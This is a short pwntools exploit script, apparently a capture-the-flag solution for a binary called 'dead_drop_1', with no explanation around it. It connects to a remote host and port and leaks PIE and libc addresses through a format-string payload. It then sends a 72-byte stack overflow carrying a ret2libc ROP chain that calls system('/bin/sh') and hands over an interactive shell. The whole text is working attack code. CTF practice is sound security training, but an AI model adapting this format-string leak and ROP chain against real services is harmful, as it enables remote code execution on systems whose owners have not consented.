from pwn import *

e = ELF("./dead_drop_1")

libc = ELF("./libc.so.6")
rop = ROP(e)
p = e.process()
p = remote("51.77.151.20", 15027)
#gdb.attach(p, gdbscript='b main\nc') 
p.recvuntil(b">>>")
_start = e.symbols["_start"]

gets = e.plt["gets"]
printf = e.plt["printf"]
ret_gadget = rop.find_gadget(['ret'])[0]
print(hex(gets))
print(hex(printf))

p.sendline(b"%17$p-%15$p")

r = p.recvline().strip()
binary_leak = r[:14]
libc_leak = r[15:29]
print(r)
print(binary_leak)
print(libc_leak)
pie_base = int(binary_leak, 16) - e.symbols['main']
print("pie_base :", hex(pie_base))

libc_base = int(libc_leak,16) + 64  - (libc.symbols["__libc_start_main"] + 10)
print("libc_base :", hex(libc_base))

gets = pie_base + gets
printf = pie_base + printf
_start = pie_base + _start
ret = pie_base + ret_gadget

system = libc_base + libc.symbols["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh"))

rop = ROP(libc)
pop_rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])[0] 
ret_gadget = rop.find_gadget(['ret'])[0]

pop_rdi = libc_base + pop_rdi_gadget
ret = libc_base + ret_gadget

p.recvuntil(b">>>")

payload = b'A' * 72
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
p.send(payload)
 
p.sendline(payload)

p.interactive()




